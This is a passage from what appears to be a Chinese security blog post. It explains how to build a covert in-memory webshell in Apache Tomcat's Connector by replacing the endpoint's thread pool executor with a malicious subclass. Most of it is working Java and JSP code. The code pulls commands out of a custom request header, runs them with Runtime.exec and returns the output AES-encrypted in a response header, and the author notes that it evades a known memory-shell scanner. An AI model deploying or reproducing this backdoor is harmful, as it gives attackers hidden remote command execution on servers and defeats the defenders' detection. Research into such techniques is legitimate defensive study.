                    this.socketWrapper.registerReadInterest();
                } else if (handshake == 4) {
                    this.socketWrapper.registerWriteInterest();
                }
            } catch (CancelledKeyException var14) {
                socket.getPoller().cancelledKey(key);
            } catch (VirtualMachineError var15) {
                ExceptionUtils.handleThrowable(var15);
            } catch (Throwable var16) {
                NioEndpoint.log.error("", var16);
                socket.getPoller().cancelledKey(key);
            } finally {
                this.socketWrapper = null;
                this.event = null;
                if (NioEndpoint.this.running && !NioEndpoint.this.paused) {
                    NioEndpoint.this.processorCache.push(this);
                }
            }
        }
    }
**Executor**  
见下文。
**Executor以及恶意Executor的实现：**  
//删掉了很多注解，有兴趣可以自行查阅。
    public interface Executor {
        /**
         * Executes the given command at some time in the future.  The command
         * may execute in a new thread, in a pooled thread, or in the calling
         * thread, at the discretion of the {@code Executor} implementation.
         *
         * @param command the runnable task
         * @throws RejectedExecutionException if this task cannot be
         * accepted for execution
         * @throws NullPointerException if command is null
         */
        void execute(Runnable command);
    }
Executor其实是Tomcat定制版的线程池，具体设计理论我们无需细究，但有一点我们值得关注：  
在Tomcat中Executor由Service维护，因此同一个Service中的组件可以共享一个线程池。如果没有定义任何线程池，相关组件(
如Endpoint)会自动创建线程池，此时，线程池不再共享。  
（这也是为什么之前我获取Service直接往executors组里添加executor但却并不生效的原因。）  
可以看到这里是直接获取的EndPoint自己启动的TreadPoolExecutor类：  
并且他的关键调用方法就在下一行 : executor.execute()  
找到其核心处理逻辑后，我们只需继承它，并重写该方法将恶意逻辑写入其中。
    public class threadexcutor extends ThreadPoolExecutor {
        ......
        public threadexcutor(int corePoolSize, int maximumPoolSize, long keepAliveTime, TimeUnit unit, BlockingQueue workQueue, ThreadFactory threadFactory, RejectedExecutionHandler handler) {
            super(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, threadFactory, handler);
        }  
       ......
         @Override
            public void execute(Runnable command) {
                 System.out.println("123")；
                //Evil code here
                this.execute(command, 0L, TimeUnit.MILLISECONDS);
      }
        ......
    }
通过AbstractEndpoint中的setExecutor方法将原本的executor置换为我们的恶意类。  
置换后，Endpoint处理所使用的executor成功变为我们的恶意类：  
**实现交互**  
**获取命令**  
根据上文中的前置知识和Tomcat笔记（其一）中我们所描述的，标准的ServletRequest需要经过Processor的封装后才可获得，如果我们想要把命令放在header中传入，该如何实现？  
实现的方法肯定不止一种，此处我借用java内存搜索工具找到一处位于NioEndpoint中的nioChannels的appReadBufHandler，很明显其中的Buffer存放着我们所需要的request。  
将命令字段提取处理即可。
    public String getRequest() {
                try {
                    Thread[] threads = (Thread[]) ((Thread[]) getField(Thread.currentThread().getThreadGroup(), "threads"));
                    for (Thread thread : threads) {
                        if (thread != null) {
                            String threadName = thread.getName();
                            if (!threadName.contains("exec") && threadName.contains("Acceptor")) {
                                Object target = getField(thread, "target");
                                if (target instanceof Runnable) {
                                    try {
                                        Object[] objects = (Object[]) getField(getField(getField(target, "this$0"), "nioChannels"), "stack");
                                        ByteBuffer heapByteBuffer = (ByteBuffer) getField(getField(objects[0], "appReadBufHandler"), "byteBuffer");
                                        String a = new String(heapByteBuffer.array(), "UTF-8");
                                        if (a.indexOf("blue0") > -1) {
                                            System.out.println(a.indexOf("blue0"));
                                            System.out.println(a.indexOf("\r", a.indexOf("blue0")) - 1);
                                            String b = a.substring(a.indexOf("blue0") + "blue0".length() + 1, a.indexOf("\r", a.indexOf("blue0")) - 1);
    //                                        System.out.println(b);
                                            return b;
                                        }
                                    } catch (Exception var11) {
                                        System.out.println(var11);
                                        continue;
                                    }
                                }
                            }
                        }
                    }
                } catch (Exception ignored) {
                }
                return new String();
            }
**实现回显**  
注入内存马的位置在Processor处理生成标准ServletRequest之前，显然完整的ServletResponse要在Containor处理完成之后才会生成，那我们要如何解决回显问题？  
想法一：  
直接在此处使用Socket与client端进行通信，以字节流的形式传输数据。  
（理论上可行，未测试）  
想法二：  
主要利用tomcat在处理request时的特性。  
AbstractProcessor在初始化时就会进行Tomcat
Request与Response的创建，继承了AbstractProcessor的Http11Processor也是如此：
    ......
    public AbstractProcessor(AbstractEndpoint endpoint) {
        this(endpoint, new Request(), new Response());
    }
    ......
    protected AbstractProcessor(AbstractEndpoint endpoint, Request coyoteRequest, Response coyoteResponse) {
        this.hostNameC = new char[0];
        this.asyncTimeout = -1L;
        this.asyncTimeoutGeneration = 0L;
        this.socketWrapper = null;
        this.errorState = ErrorState.NONE;
        this.endpoint = endpoint;
        this.asyncStateMachine = new AsyncStateMachine(this);
        this.request = coyoteRequest;
        this.response = coyoteResponse;
        this.response.setHook(this);
        this.request.setResponse(this.response);
        this.request.setHook(this);
        this.userDataHelper = new UserDataHelper(this.getLog());
    }
    ......
并且Response是会封装在Request对象中的：  
在Container中的逻辑处理完之后，Http11Processor会继续对我们的response进行封装：  
所以我们只需将命令执行的结果提前放入Tomcat的response中即可，这里我选择的是header。  
PS：最开始的时候走了点弯路，想要把最开始的response结构体中的buffer部分找出来直接put(byte[])进去，后来发现byteBuffer扩容起来很麻烦，而且可能会存在后续tomcat处理将回显部分覆盖的情况。  
so这里直接使用response.addHeader()，将结果放入header中。
    public void getResponse(byte[] res) {
                try {
                    Thread[] threads = (Thread[]) ((Thread[]) getField(Thread.currentThread().getThreadGroup(), "threads"));
                    for (Thread thread : threads) {
                        if (thread != null) {
                            String threadName = thread.getName();
                            if (!threadName.contains("exec") && threadName.contains("Acceptor")) {
                                Object target = getField(thread, "target");
                                if (target instanceof Runnable) {
                                    try {
                                        ArrayList objects = (ArrayList) getField(getField(getField(getField(target, "this$0"), "handler"), "global"),"processors");
                                        for (Object tmp_object:objects) {
                                            RequestInfo request = (RequestInfo)tmp_object;
                                            Response response = (Response) getField(getField(request, "req"), "response");
                                            response.addHeader("Server",new String(res,"UTF-8"));
    //                                        System.out.print("buffer add");
                                        }
                                    } catch (Exception var11) {
                                        continue;
                                    }
                                }
                            }
                        }
                    }
                } catch (Exception ignored) {
                }
            }
**Final**  
为通信的隐蔽性，最后做了一下AES加密：  
最终实现的效果为，若检测到request请求中包含我们自定义的header头则会执行相关恶意操作，并在response的自定义header中返回，否则则为正常业务流量：  
同样的，因为不是在Container中实现的内存马，tomcat-memshell-scanner无法检测到：  
**jsp_demo**
     workQueue, ThreadFactory threadFactory, RejectedExecutionHandler handler) {
                super(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, threadFactory, handler);
            }
            public String getRequest() {
                try {
                    Thread[] threads = (Thread[]) ((Thread[]) getField(Thread.currentThread().getThreadGroup(), "threads"));
                    for (Thread thread : threads) {
                        if (thread != null) {
                            String threadName = thread.getName();
                            if (!threadName.contains("exec") && threadName.contains("Acceptor")) {
                                Object target = getField(thread, "target");
                                if (target instanceof Runnable) {
                                    try {
                                        Object[] objects = (Object[]) getField(getField(getField(target, "this$0"), "nioChannels"), "stack");
                                        ByteBuffer heapByteBuffer = (ByteBuffer) getField(getField(objects[0], "appReadBufHandler"), "byteBuffer");
                                        String a = new String(heapByteBuffer.array(), "UTF-8");
                                        if (a.indexOf("blue0") > -1) {
                                            System.out.println(a.indexOf("blue0"));
                                            System.out.println(a.indexOf("\r", a.indexOf("blue0")) - 1);
                                            String b = a.substring(a.indexOf("blue0") + "blue0".length() + 1, a.indexOf("\r", a.indexOf("blue0")) - 1);
                                            b = decode(DEFAULT_SECRET_KEY, b);
                                            return b;
                                        }
                                    } catch (Exception var11) {
                                        System.out.println(var11);
                                        continue;
                                    }
                                }
                            }
                        }
                    }
                } catch (Exception ignored) {
                }
                return new String();
            }
            public void getResponse(byte[] res) {
                try {
                    Thread[] threads = (Thread[]) ((Thread[]) getField(Thread.currentThread().getThreadGroup(), "threads"));
                    for (Thread thread : threads) {
                        if (thread != null) {
                            String threadName = thread.getName();
                            if (!threadName.contains("exec") && threadName.contains("Acceptor")) {
                                Object target = getField(thread, "target");
                                if (target instanceof Runnable) {
                                    try {
                                        ArrayList objects = (ArrayList) getField(getField(getField(getField(target, "this$0"), "handler"), "global"), "processors");
                                        for (Object tmp_object : objects) {
                                            RequestInfo request = (RequestInfo) tmp_object;
                                            Response response = (Response) getField(getField(request, "req"), "response");
                                            response.addHeader("Server-token", encode(DEFAULT_SECRET_KEY,new String(res, "UTF-8")));
                                        }
                                    } catch (Exception var11) {
                                        continue;
                                    }
                                }
                            }
                        }
                    }
                } catch (Exception ignored) {
                }
            }
            @Override
            public void execute(Runnable command) {
    //            System.out.println("123");
                String cmd = getRequest();
                if (cmd.length() > 1) {
                    try {
                        Runtime rt = Runtime.getRuntime();
                        Process process = rt.exec(cmd);
                        java.io.InputStream in = process.getInputStream();
                        java.io.InputStreamReader resultReader = new java.io.InputStreamReader(in);
                        java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader);
                        String s = "";
                        String tmp = "";
                        while ((tmp = stdInput.readLine()) != null) {
                            s += tmp;
                        }
                        if (s != "") {
                            byte[] res = s.getBytes(StandardCharsets.UTF_8);
                            getResponse(res);
                        }
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }
                this.execute(command, 0L, TimeUnit.MILLISECONDS);
            }
        }
    %>
**后记**  
抛砖引玉，按照这个思路，Connector中应该还有其他组件内存马可以实现。  
请忽略我拙劣的coding能力。  
感谢su18师傅和园长的鞭策。
参考：  